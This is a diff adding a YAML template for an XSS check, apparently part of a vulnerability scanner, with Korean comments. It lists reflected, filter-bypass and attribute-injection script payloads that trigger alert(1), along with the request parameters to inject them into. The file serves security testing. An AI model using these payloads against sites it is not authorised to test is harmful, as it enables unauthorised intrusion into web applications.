@@ -1,0 +1,47 @@
+meta:
+  name: 'XSS (Cross-Site Scripting)'
+  version: '1.0'
+  extends: 'base.yaml'
+  severity: 'Medium'
+  reference: 'OWASP A03:2021'
+
+detection:
+  marker: 'xss_proof_'
+  check_stored: false
+
+# 페이로드 목록
+payloads:
+  # 기본 반사형
+  basic:
+    - '<script>alert(1)</script>'
+    - '<img src=x onerror=alert(1)>'
+    - '<svg onload=alert(1)>'
+    - '"''><script>alert(1)</script>'
+    - '</title><script>alert(1)</script>'
+
+  # 필터 우회
+  bypass:
+    - '<ScRiPt>alert(1)</ScRiPt>'
+    - '<img src=x onerror="alert(1)">'
+    - '<body onload=alert(1)>'
+    - 'javascript:alert(1)'
+    - '<iframe src="javascript:alert(1)">'
+    - '<%2fscript>'
+
+  # 속성 삽입
+  attribute:
+    - '" onmouseover="alert(1)'
+    - "' onmouseover='alert(1)"
+    - '" autofocus onfocus="alert(1)'
+
+# 파라미터 타겟
+target_params:
+  - 'q'
+  - 'search'
+  - 'query'
+  - 'name'
+  - 'comment'
+  - 'message'
+  - 'redirect'
+  - 'url'
+  - 'return'
